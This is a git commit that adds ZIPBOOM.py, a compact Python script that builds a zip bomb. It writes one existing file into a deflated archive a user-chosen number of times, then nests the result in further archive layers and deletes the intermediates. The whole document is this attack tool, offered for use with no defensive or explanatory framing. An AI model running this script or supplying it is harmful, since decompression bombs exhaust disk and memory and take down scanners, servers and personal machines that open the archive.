56f3aa976c6e1a5cb30649daa4c946651cb4ced1
L0x267 <153518329+L0x267@users.noreply.github.com>
2023-12-11 21:16:24 +0800

    Add files via upload

---
+++ ZIPBOOM.py
@@ -0,0 +1,3 @@
+import os,zipfile,sys;n,name,typ=int(sys.argv[sys.argv.index('--file-size')+1]),sys.argv[sys.argv.index('--name')+1]if'--name'in sys.argv else'ZIP-BOOM-FINAL',sys.argv[sys.argv.index('--type')+1]if'--type'in sys.argv else'7z';z=zipfile.ZipFile(f'0.{typ}','w',zipfile.ZIP_DEFLATED)
+for i in range(n):z.write('00.7z',arcname=f'{str(hex(i))[2:]}.{typ}');print('RETURN:',i,'DONE')
+z.close();b,a=zipfile.ZipFile(f'1.{typ}','w',zipfile.ZIP_DEFLATED),zipfile.ZipFile(f'{name}.{typ}','w',zipfile.ZIP_DEFLATED);b.write(f'0.{typ}');b.close();a.write(f'1.{typ}');a.close();os.remove(f'1.{typ}');os.remove(f'0.{typ}');print('DONE')
